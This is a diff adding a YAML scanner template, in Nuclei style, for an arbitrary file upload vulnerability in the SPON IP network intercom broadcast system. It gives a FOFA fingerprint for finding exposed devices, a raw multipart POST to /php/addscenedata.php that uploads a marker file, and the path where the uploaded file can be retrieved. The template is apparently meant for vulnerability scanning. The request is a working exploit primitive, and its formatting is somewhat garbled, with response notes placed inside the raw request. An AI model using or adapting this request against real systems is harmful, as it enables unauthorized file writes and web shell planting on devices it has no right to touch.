@@ -1,0 +1,62 @@
+id: poc-oc2rbhvqkgqxm8ml
+info:
+  name: spon IP网络对讲广播系统任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/oc2rbhvqkgqxm8ml'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: oc2rbhvqkgqxm8ml
+    fofa: icon_hash="-1700598274"
+http:
+- raw:
+  - 'POST /php/addscenedata.php HTTP/1.1
+
+
+    Connection: close
+
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4LuoBRpTiVBo9cIQ
+
+
+    Accept-Encoding: gzip
+
+
+
+
+    ------WebKitFormBoundary4LuoBRpTiVBo9cIQ
+
+
+    Content-Disposition: form-data; name="upload"; filename="dudesuite.txt"
+
+
+    Content-Type: text/plain
+
+
+
+
+    dudesuite
+
+
+    ------WebKitFormBoundary4LuoBRpTiVBo9cIQ--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    /images/scene/dudesuite.txt'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
